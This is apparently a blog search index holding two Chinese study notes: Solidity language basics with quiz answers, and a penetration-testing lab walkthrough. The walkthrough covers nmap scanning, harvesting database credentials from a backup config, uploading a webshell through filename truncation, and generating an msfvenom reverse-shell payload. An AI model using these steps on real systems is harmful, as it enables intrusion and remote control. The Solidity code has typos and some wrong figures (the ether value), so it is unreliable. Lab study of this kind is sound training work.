<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【学习笔记】solidity基础001</title>
      <link href="/2024/11/07/solidity%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89/"/>
      <url>/2024/11/07/solidity%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>关键词：变量 数值类型 函数 数组 印射<br>仅个人学习使用（WTF学习笔记）</p><h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><h4 id="初始值"><a href="#初始值" class="headerlink" title="初始值"></a>初始值</h4><p><strong>bytes1</strong> <strong>是固定大小的字节类型，表示一个 1 字节的值（8 位）。它的初始值（默认值）是 0x00，即所有位都为 0。</strong></p><p><strong>具体解释：</strong></p><ul><li><strong>在 Solidity 中，任何未赋值的变量都会有一个默认值。对于 bytes1 类型，它的默认值是一个长度为 1 字节的值，所有的位都被初始化为 0，用十六进制表示为 0x00。</strong></li><li><strong>如果用二进制表示，它是 00000000。</strong></li></ul><p><strong>值类型初始值</strong></p><ul><li><p><strong>boolean: false</strong></p></li><li><p><strong>string: “”</strong></p></li><li><p><strong>int: 0</strong></p></li><li><p><strong>uint: 0</strong></p></li><li><p><strong>enum:</strong> <strong>枚举中的第一个元素</strong></p></li><li><p><strong>address</strong>: 0x0000000000000000000000000000000000000000 (或 address(0))</p></li><li><p><strong>function</strong></p></li><li><ul><li><strong>internal:</strong> <strong>空白函数</strong></li><li><strong>external:</strong> <strong>空白函数</strong></li></ul></li></ul><p><strong>引用类型初始值</strong></p><ul><li><p><strong>映射mapping: 所有元素都为其默认值的mapping</strong></p></li><li><p><strong>结构体struct: 所有成员设为其默认值的结构体</strong></p></li><li><p><strong>数组array</strong></p></li><li><ul><li><strong>动态数组: []</strong></li><li><strong>静态数组（定长）: 所有成员设为其默认值的静态数组</strong></li></ul></li></ul><p>Bytes4 类型表示的是一个固定长度的字节数组，长度为 4 个字节。每个字节由 2 个十六进制字符表示，因此：<br>• 1 字节 &#x3D; 2 个十六进制字符<br>• 4 字节 &#x3D; 4 × 2 &#x3D; 8 个十六进制字符<br>因此，<strong>bytes4类型具有 8 个十六进制位。</strong><br>示例：<br>例如，一个 bytes4 类型的值可能是 0x12345678，这里的 12345678 就是 8 个十六进制字符。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><h4 id="可见性说明符"><a href="#可见性说明符" class="headerlink" title="可见性说明符"></a>可见性说明符</h4><h4 id="pure-view-payable"><a href="#pure-view-payable" class="headerlink" title="pure|view|payable"></a>pure|view|payable</h4><h4 id="函数输出"><a href="#函数输出" class="headerlink" title="函数输出"></a>函数输出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory) &#123;</span><br><span class="line">   return (1, true, [uint256(1), 2, 5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><span style = "color: blue;">此处memory是什么？</span><br>  是用于指定数据存储位置的关键字。<strong>它标识的是数据在内存中存储，而不是在区块链上永久存储，通常用于临时存储复杂数据类型（如数组或结构体）并在函数执行期间操作它们，执行完毕后释放资源</strong>。具体来说，memory 指定了在函数执行期间，数据只临时存储在内存中，一旦函数执行完毕，内存中的数据就会被释放。<br>  例如此处：uint256[3] memory 中的 memory 指定了数组 [uint256(1), 2, 5] 将在内存中临时存储，而不是在区块链的持久存储（即 storage）中存储。</p><p>  此处代码解析：</p><ul><li>uint256[3] memory: 定义了一个长度为 3 的 uint256 类型数组，并将其存储在内存中。</li><li>[unit256(1),2,5]:<br>• uint256(1)：这个表示法将 1 明确地转换为 uint256 类型。在某些情况下Solidity 可能会自动推断出整数类型为 uint256，但是为了确保类型一致性，可以使用这种显式类型转换。<br>• 2 和 5：这两个值直接写为整数，Solidity会自动将它们识别为 uint256 类型，因它们是未指定类型的字面常量，且默认情况下 Solidity 会将整数推断为 uint256。</li></ul><h2 id="变量数据存储和作用域："><a href="#变量数据存储和作用域：" class="headerlink" title="变量数据存储和作用域："></a>变量数据存储和作用域：</h2><h3 id="1-声明类型"><a href="#1-声明类型" class="headerlink" title="1. 声明类型"></a>1. 声明类型</h3><h4 id="1-1-Solidity数据存储位置"><a href="#1-1-Solidity数据存储位置" class="headerlink" title="1.1 Solidity数据存储位置"></a>1.1 Solidity数据存储位置</h4><pre><code>有三类：storage，memory和calldata。</code></pre><h4 id="1-2-赋值和引用"><a href="#1-2-赋值和引用" class="headerlink" title="1.2 赋值和引用"></a>1.2 赋值和引用</h4><h4 id="1-3常数-constant和immutable"><a href="#1-3常数-constant和immutable" class="headerlink" title="1.3常数 constant和immutable"></a><strong>1.3常数 constant和immutable</strong></h4><p><span style="color: red;"><strong>只有数值变量可以声明constant和immutable；string和bytes可以声明为constant，但不能为immutable</strong></span></p><ul><li><strong>constant变量必须在声明的时候初始化，之后再也不能改变。尝试改变的话，编译不通过</strong></li><li><strong>immutable变量可以在声明时或构造函数中初始化</strong></li><li><strong>immutable变量既在声明时初始化，又在constructor中初始化，会使用constructor初始化的值。</strong></li></ul><h3 id="2-作用域"><a href="#2-作用域" class="headerlink" title="2. 作用域"></a>2. 作用域</h3><h4 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h4><h4 id="2-2"><a href="#2-2" class="headerlink" title="2.2"></a>2.2</h4><h3 id="2-3全局变量"><a href="#2-3全局变量" class="headerlink" title="2.3全局变量"></a>2.3全局变量</h3><h4 id="2-3-1以太单位-时间单位"><a href="#2-3-1以太单位-时间单位" class="headerlink" title="2.3.1以太单位&amp;时间单位"></a>2.3.1以太单位&amp;时间单位</h4><h3 id="2-4引用类型"><a href="#2-4引用类型" class="headerlink" title="2.4引用类型"></a>2.4引用类型</h3><h4 id="2-4-1数组"><a href="#2-4-1数组" class="headerlink" title="2.4.1数组"></a>2.4.1数组</h4><p>分为：<br>固定数组；<br>可变数组；<br>（bytes比较特殊，是数组，但是不用加[]另外，不能用byte[]声明单字节数组，可以使用bytes或bytes1[]。bytes比bytes1[]省gas。</p><p><strong>创建数组的规则</strong><br>对于memory修饰的动态数组，可以用new操作符号来创建，但是必须声明长度，并且声明后长度不能改变。</p><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// memory动态数组</span><br><span class="line">uint[] memory array8 = new uint[](5);</span><br><span class="line">bytes memory array9 = new bytes(9);</span><br></pre></td></tr></table></figure><p>如果创建的是动态数组，需要一个一个元素的赋值。</p><p><strong>数组成员</strong></p><ul><li><strong>length</strong>: 数组有一个包含元素数量的<strong>length</strong>成员，<strong>memory</strong>数组的长度在创建后是固定的。</li><li><strong>push()</strong>: <strong>动态数组</strong>拥有<strong>push()<strong>成员，可以在数组最后添加一个</strong>0</strong>元素，并返回该元素的引用。</li><li><strong>push(x)</strong>: <strong>动态数组</strong>拥有<strong>push(x)<strong>成员，可以在数组最后添加一个</strong>x</strong>元素。</li><li><strong>pop()</strong>: <strong>动态数组</strong>拥有**pop()**成员，可以移除数组最后一个元素（与数据结构的栈相同）</li></ul><h4 id="2-4-2结构体"><a href="#2-4-2结构体" class="headerlink" title="2.4.2结构体"></a>2.4.2结构体</h4><p><strong>创建结构体</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//结构体</span><br><span class="line">struct Student&#123;</span><br><span class="line">uint256 id;</span><br><span class="line">uint256 score;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Student student;//初始化一个student结构体</span><br></pre></td></tr></table></figure><p><strong>结构体赋值方法</strong></p><p><em>方法1:在函数中创建一个storage的struct引用</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function initStudent1() external&#123;</span><br><span class="line">Student storage _student = student;</span><br><span class="line">_stdent.id = 11;</span><br><span class="line">_student.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>storage</strong></p><p><em>方法2:直接引用状态变量的struct</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function initStudent2() external&#123;</span><br><span class="line">student.id = 11;</span><br><span class="line">stundet.score = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>方法3:构造函数式</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function initStudent3() external&#123;</span><br><span class="line">student = Student(11,100);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>方法4:key value</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function initStudent4() external&#123;</span><br><span class="line">student = Student(&#123;id: 11,score: 100&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-3印射-（mapping"><a href="#2-4-3印射-（mapping" class="headerlink" title="2.4.3印射 （mapping)"></a>2.4.3印射 （mapping)</h4><p><strong>定义： Solidity中存储键值对的数据结构，可以理解为哈希表</strong></p><p><strong>mapping变量不存长度信息</strong></p><p>在映射中，人们可以<strong>通过键（Key）来查询对应的值（Value）</strong></p><p>比如：通过一个人的id来查询他的钱包地址。</p><p>格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapping(_KeyType =&gt; _ValueType)</span><br></pre></td></tr></table></figure><p>其中_KeyType和_ValueType分别是Key和Value的变量类型</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(uint =&gt; address) public idToAddress; // id映射到地址</span><br><span class="line">mapping(address =&gt; address) public swapPair; // 币对的映射，地址到地址</span><br></pre></td></tr></table></figure><h6 id="映射的规则"><a href="#映射的规则" class="headerlink" title="映射的规则"></a>映射的规则</h6><p><strong>规则1</strong></p><p>映射的_keytype只能选择solidity内置的值类型，比如uint,address等，不能用自定义的结构体，而_Valuetype可以使用自定义的类型（例如：结构体）。</p><p><strong>规则2</strong></p><p>映射的存储位置必须是storage，因此可以用于合约的状态变量，函数中的storage变量和library函数的参数（<a href="https://github.com/ethereum/solidity/issues/4635">例子</a>）。不能用于public函数的参数或返回结果中，因为mapping记录的是一种关系（key-value pair)。</p><p><strong>规则3</strong></p><p>如果映射声明为 public，那么Solidity会自动给你创建一个 getter 函数，可以通过 key 来查询对应的 value 。<br><strong>规则4</strong></p><p>给映射新增的键值对的语法为_var[_Key]&#x3D; _value，其中 _var 是映射变量名，_Key 和_value 对应新增的键值对。</p><p>eg: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function writeMap(uint key,address Value)public&#123;</span><br><span class="line">idToAddress[ Key]= Value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>请解释下面这段代码的意思：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">address payable addr;</span><br><span class="line">addr.transfer(1);</span><br></pre></td></tr></table></figure><p>选择一个答案<br>A. 调用者向合约转账1wei<br>B. 调用者向addr转账1wei<br>C. 合约向addr转账1wei<br>D. 合约向addr转账1ether</p><p><strong>解析：</strong></p><ul><li>address payable: 这是一个 payable 地址类型，表示这个地址能够接收以太币（ether）转账。只有 payable 地址才允许进行 transfer() 或 send() 操作。</li><li>addr.transfer(1): 这是一个转账操作，向地址 addr 转账 1 单位的以太币，单位是 wei。在以太坊中，最小的货币单位是 wei，而 1 ether &#x3D; 10^18 wei。因此，这里转账的数额是 1 wei，而不是 1 ether。</li><li>transfer操作是合约向addr转账。<br>正确答案选c</li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>以下关于数组的说法中，正确的是(选择一个答案)</p><p> A. 固定长度数组和bytes拥有push()成员，可以在数组最后添加一个0元素。</p><p> B. 数组字面常数，例如[uint(1),2,3]，需要声明第一个元素的类型，不然默认用存储空间最大的类型</p><p> C. 内存数组的长度在创建后是固定的。 </p><p> D. 对于memory可变长度数组，可以用new操作符来创建，并且不用声明长度，例如uint[] </p><p><strong>解析</strong>：</p><ul><li><p><strong>A. 固定长度数组和 bytes 拥有 push() 成员，可以在数组最后添加一个0元素。</strong><br> 这句话是错误的。<strong>固定长度数组</strong>没有 push() 成员，只有 <strong>可变长度数组</strong>     才有 push() 成员，而 bytes 是可变长度数组，因此 bytes 可以使用 push()，但固定长度数组不能。</p></li><li><p>选项 B 的说法 不正确。原因：<strong>在 Solidity 中，数组字面常量的类型推断并不会自动默认为存储空间最大的类型。</strong>类型推断基于数组字面量中的元素值：对于一个字面量数组，如 [1, 2, 3]，Solidity 会推断这些数字为最小的适当类型。例如，在这种情况下，uint8 就足够了，因为所有数字都能用 8 位来表示，而不会默认推断为 uint256。<strong>只有在数组的元素中存在更大范围的数值时，编译器才会选择相应的更大类型。如果你希望指定一个更大的类型（比如 uint256），需要显式地声明。</strong>因此，数组字面常量中的类型并不会默认使用存储空间最大的类型，而是基于实际的数值大小来推断最适合的类型。</p><p><strong>示例：</strong></p><p>[1, 2, 3] 会推断为 uint8。</p><p>[uint256(1), 2, 3] 才会显式地使用 uint256 进行类型推断。</p></li></ul><p>所以，B 选项的说法是 不正确的。</p><ul><li><p><strong>C. 内存数组的长度在创建后是固定的。</strong></p></li><li><p>D. 这句话是错误的。使用 new 操作符创建内存数组时，必须指定数组的长度，不能省略长度声明。正确的用法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint[] memory array = new uint[](length);</span><br></pre></td></tr></table></figure></li></ul><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>以下关于结构体的说法中，错误的是</p><p>选择一个答案</p><p>A. 通过结构体的形式可以定义新的类型。</p><p>B. 结构体内可以包含字符串，整型等基本数据类型，也可以包含数组，映射，结构体等复杂类型。</p><p>C. 结构体内可以包含其本身。</p><p><strong>解析</strong>：</p><ul><li>A. 这是正确的。结构体在 Solidity 中用于定义新的自定义类型，允许开发者创建更复杂的数据结构。</li><li>B. 这是正确的。结构体可以包含基本数据类型（如 uint、string），也可以包含复杂类型（如数组、映射、其他结构体）。</li><li>C.  这是错误的。在 Solidity 中，结构体不能直接包含其本身，因为这会导致无限嵌套，无法确定内存的大小。不过，结构体可以包含指向其他结构体的     引用，例如使用指针或映射的方式来实现递归关系。</li></ul><p>因此，选项 C 是错误的。</p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p> 在如下的合约中，我们定义了四个 immutable 的变量 y1, y2, y3, y4。</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> uint256 immutable y1; </span><br><span class="line"></span><br><span class="line">address immutable y2; </span><br><span class="line"></span><br><span class="line">address immutable y3; </span><br><span class="line"></span><br><span class="line">uint256 immutable y4;</span><br><span class="line"></span><br><span class="line"> constructor (uint256 _y4)&#123; </span><br><span class="line"></span><br><span class="line">y1 = block.number; </span><br><span class="line"></span><br><span class="line">y2 = address(this);</span><br><span class="line"></span><br><span class="line">y3 = msg.sender;</span><br><span class="line"></span><br><span class="line">y4 = _y4; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>其中，确实有必要在构造函数 constructor 中才赋值的一项是： </p><p>A. y1 B. y2 C. y3 D. y4</p><p><strong>解析：</strong></p><ul><li><strong>y4 是通过构造函数参数 _y4 传入的值，因此只有在部署合约时才能确定它的值，这使得它必须在构造函数中赋值。</strong></li></ul><p><strong>其他变量在构造函数外也可以直接赋值，或者它们的值是在合约部署时自动确定的：</strong></p><ul><li><strong>y1：可以在合约外直接赋值为 block.number，表示合约部署时的区块号。</strong></li><li><strong>y2：可以直接设置为 address(this)，即合约自身的地址，在合约部署时自动确定。</strong></li><li><strong>y3：可以直接设置为 msg.sender，即部署合约的地址，也是在合约部署时自动确定的。</strong></li></ul><p><strong>因此，只有 y4 是依赖于构造函数参数，必须在构造函数中进行赋值。选D。</strong></p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p><strong>下面定义变量的语句中，会报错的一项是：</strong> </p><p><strong>A. string constant x5 &#x3D; “hello world”;</strong> </p><p><strong>B. address constant x6 &#x3D; address(0);</strong> </p><p><strong>C. string immutable x7 &#x3D; “hello world”;</strong> </p><p><strong>D. address immutable x8 &#x3D; address(0);</strong></p><p><strong>解析：</strong></p><ul><li><strong>在 Solidity 中，immutable 变量必须在 构造函数中 赋值，而不能在声明时直接赋值。</strong></li></ul><p><strong>具体说明：</strong></p><ul><li>**A. string constant x5 &#x3D; “hello world”;**<strong>：constant 变量必须在声明时赋值，因此这是正确的。</strong></li><li>**B. address constant x6 &#x3D; address(0);**<strong>：constant 变量在声明时赋值是正确的。</strong></li><li>**C. string immutable x7 &#x3D; “hello     world”;**<strong>：这是错误的，因为 immutable 变量不能在声明时赋值，必须在构造函数中进行赋值。</strong></li><li>**D. address immutable x8 &#x3D; address(0);**<strong>：虽然是 immutable 变量，但它的赋值可以在构造函数中完成，定义时不能直接赋值。此处代码如果在构造函数中赋值是正确的。</strong></li></ul><p><strong>因此，选项 C 会报错。</strong></p><p> <strong>ps</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//命名式返回</span><br><span class="line">function returnNamed() public pure returns(uint256_number, bool _bool, uint256[3] memory _array)(</span><br><span class="line">_number = 2;</span><br><span class="line">_bool = false;</span><br><span class="line">_array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>命名式返回，依然支持return</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function returnNamed2() public pure returns(uint256 _number,bool _bool,unit256[3] memory _arrray)</span><br><span class="line">&#123;</span><br><span class="line"> return(1,true,[unit256(1),2,5]);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li><p>_array 被赋值为 [uint256(3), 2, 1]。这表示它是一个包含三个元素的数组，其中：<br>• 第一个元素是 3（明确类型转换为 uint256）。<br>• 第二个元素是 2（自动推断为 uint256）。<br>• 第三个元素是 1（自动推断为 uint256）。</p></li><li><p>Solidity中不存在小数点，以0代替为小数点，举例<br>在Solidity 中，确实没有内置的浮点数（即小数点），因此所有数字必须使用整数类型来表示。这就需要通过一些技巧来模拟小数点，通常是通过将小数值放大为整数来进行计算。例如，如果要表示金额，可以假设整数中的最低位是 “小数点后的一位” 或更多位，这样就能间接表示小数。<br>例子：<br>假设我们想在 Solidity 中表示货币金额，而没有浮点数。我们可以使用整数表示金额，并通过约定整数的最后几位代表小数部分。常见的方法是<strong>将金额放大 10^18（即使用以太坊中的 wei 单位），将以太作为以太坊中的基本单位</strong>。<br>举例 1: 表示金额<br>假设要表示 1.5 个以太币。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256 public amount = 1.5 * 10**18; // 1.5 Ether 等于 1.5 * 10^18 wei</span><br></pre></td></tr></table></figure><p>• 在这里，我们使用 10^18 来表示一个以太币，因为<strong>1 ether &#x3D; 10^18 wei</strong>。为了表示 1.5 个以太币，我们将 1.5 乘以 10^18，最终得到 1500000000000000000 wei。<br>• 尽管 Solidity 不支持浮点数，但我们通过使用整数和固定的精度来实现。<br>举例 2: 模拟小数点计算<br>假设我们有一个代币，代币的精度是小数点后 2 位。我们可以通过放大 100 倍来处理小数点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint256 public pricePerToken = 150; // 实际上表示 1.50 单位（放大了100倍）</span><br></pre></td></tr></table></figure><p><strong>我们可以通过数学计算来恢复小数点后的值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 price = pricePerToken / 100;      // 还原整数部分</span><br><span class="line">uint256 decimals = pricePerToken % 100;   // 取出小数部分</span><br></pre></td></tr></table></figure><p>这样 150 就表示 1.50，即使用整数的 150 来代表 1.50。<br>举例 3: 更高精度<br>如果需要<strong>更多的精度，比如小数点后 6 位，可以通过乘以 10^6 来处理</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint256 public value = 1234567; // 实际表示 1.234567</span><br><span class="line">总结</span><br></pre></td></tr></table></figure><p>在 Solidity 中，通过使用整数来表示带有小数点的值，可以避免精度问题。具体方法是根据需要的精度将小数部分转化为整数进行计算，并在使用时再将其缩放回实际数值。例如，通过乘以 10^18 或 10^6 来模拟 18 位或 6 位的小数。</p></li><li><p>Wei &#x3D; 1</p></li><li><p>Gwei &#x3D; 1e9 &#x3D; 1000000000</p></li><li><p>ether &#x3D; 1e18 &#x3D; 100000000000000000</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【学习笔记】渗透测试过程1</title>
      <link href="/2024/11/06/penetration_testing_steps/"/>
      <url>/2024/11/06/penetration_testing_steps/</url>
      
        <content type="html"><![CDATA[<h2 id="1-设置网络环境"><a href="#1-设置网络环境" class="headerlink" title="1. 设置网络环境"></a>1. 设置网络环境</h2><ul><li><p>将 Kali 虚拟机和靶机的网络适配器改为<strong>桥接模式</strong>。</p></li><li><p>在 Kali 虚拟机和靶机相互 ping 通，确保网络连通性。</p></li><li><p>切换到 <code>root</code> 模式进行操作。</p></li><li><p>Nmap（用于信息收集 资产探测：ip存活、系统、软件、软件版本、端口）</p></li><li><p><strong>扫描网段</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.42.0/24</span><br></pre></td></tr></table></figure><blockquote><p>查看网段中存活的主机。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/rWMvxBAIFEKR2sj.png" alt="1.png"></p></li><li><p><strong>全面扫描靶机</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在本实验获取数据库端口（1433）。</p></blockquote></li><li><p><strong>判断系统类型</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><blockquote><p>在 <code>running:</code> 后面查看主机系统信息。</p></blockquote><p>【图片2】</p></li><li><p><strong>服务版本扫描(运行软件）</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/wKv9uQmBhrnHEVf.png" alt="3.png"></p></li><li><p><strong>端口扫描</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 (目标端口)&lt;靶机IP&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/06/zKij7s6kvE9Nclt.png" alt="4.png"></p></li><li><p><strong>端口 27689 测试</strong>：扫描出异常(unknown）端口，在浏览器访问 <code>&lt;靶机IP&gt;:27689</code>。<br><img src="https://s2.loli.net/2024/11/06/ZXolz7xJqILSc2m.png" alt="5.png"></p></li><li><p><strong>随机 IP 扫描</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -iR(随机) &lt;数量&gt; -Pn -p 80</span><br></pre></td></tr></table></figure><blockquote><p>如果对方开了防火墙——（报）filtered http</p></blockquote></li></ul><h2 id="3-目录结构探测-使用-Dirsearch获取"><a href="#3-目录结构探测-使用-Dirsearch获取" class="headerlink" title="3. 目录结构探测 - 使用 Dirsearch获取"></a>3. 目录结构探测 - 使用 Dirsearch获取</h2><ul><li><p><strong>安装 Dirsearch</strong>，用于获取网站目录结构（取决于字典）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://&lt;靶机IP&gt;:27689/ -I 200,302</span><br></pre></td></tr></table></figure><blockquote><p>200 和 302 表示返回的状态码。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/1QB9OferEtkwIKi.png" alt="6.png"></p></li><li><p><strong>逐步访问上述图片获取的文件</strong>，在浏览器输入 <code>http://&lt;靶机IP&gt;:27689/&lt;文件名&gt;</code>。</p></li><li><p><strong>在访问 <code>web.config.bak</code></strong> 文件，得到数据库信息：</p><ul><li>数据库 IP：192.168.61.144</li><li>数据库名称：FileManage</li><li>用户名：down</li><li>密码：downsql</li></ul><p><img src="https://s2.loli.net/2024/11/06/ADWEqnZHh2kGCrK.png" alt="7.png"></p></li></ul><h2 id="4-数据库连接-使用-Navicat-连接"><a href="#4-数据库连接-使用-Navicat-连接" class="headerlink" title="4. 数据库连接 - 使用 Navicat 连接"></a>4. 数据库连接 - 使用 Navicat 连接</h2><ul><li>下载并安装 Navicat，使用上述数据库信息进行登录。</li><li>若连接不上，可以将 Navicat 通过 FTP 安装到虚拟机。</li></ul><p><img src="https://s2.loli.net/2024/11/06/lJZtYUFH7S8gmAh.png" alt="8.png"></p><h2 id="5-网站管理"><a href="#5-网站管理" class="headerlink" title="5. 网站管理"></a>5. 网站管理</h2><ul><li>回到网站 <code>&lt;靶机IP&gt;:27689</code>，在用户管理模块进行操作。（登入——用户管理——管理用户）</li></ul><p><img src="https://s2.loli.net/2024/11/06/WCcwqFVEDkRtjPZ.png" alt="9.png"></p><h2 id="6-上传一句话木马"><a href="#6-上传一句话木马" class="headerlink" title="6. 上传一句话木马"></a>6. 上传一句话木马</h2><ul><li><p><strong>生成一句话木马文件</strong>，在网站下载管理模块上传文件：</p><p>文件命名为 <code>aaaaaaaaa.aspx.jpg</code>（利用文件名过长被截断的特性，上传后网站删除.jpg）。</p></li></ul><p> <img src="https://s2.loli.net/2024/11/06/opBKA5PW2vECmrj.png" alt="10.png"></p><p>  <strong>上传成功后，一访问就下载：无法解析函数</strong></p><p><img src="https://s2.loli.net/2024/11/06/hSrokxYIA3M9mbW.png" alt="11.png"></p><ul><li><p><strong>获取文件绝对路径</strong>：通过访问不存在的文件查看报错，找到路径 <code>/upfile/affix/</code>。</p><p><img src="https://s2.loli.net/2024/11/06/yjicEPLAVgN49XC.png" alt="12.png"></p></li></ul><h2 id="7-连接木马"><a href="#7-连接木马" class="headerlink" title="7. 连接木马"></a>7. 连接木马</h2><ul><li>使用蚁剑连接上传的 <code>aspx</code> 文件。</li></ul><p><img src="https://s2.loli.net/2024/11/06/vUEJeHn8ab2zCWP.png" alt="13.png"></p><h2 id="8-生成并上传-MSF-木马"><a href="#8-生成并上传-MSF-木马" class="headerlink" title="8. 生成并上传 MSF 木马"></a>8. 生成并上传 MSF 木马</h2><ul><li><p><strong>生成 MSF 木马</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;靶机IP&gt; LPORT=6666 -f exe -o 123.exe</span><br></pre></td></tr></table></figure><blockquote><p>IP 是 Kali 虚拟机的 IP 地址。</p></blockquote><p><img src="https://s2.loli.net/2024/11/06/m6qtV2A7cTfrI3x.png" alt="14.png"></p></li><li><p><strong>启动监听器</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span 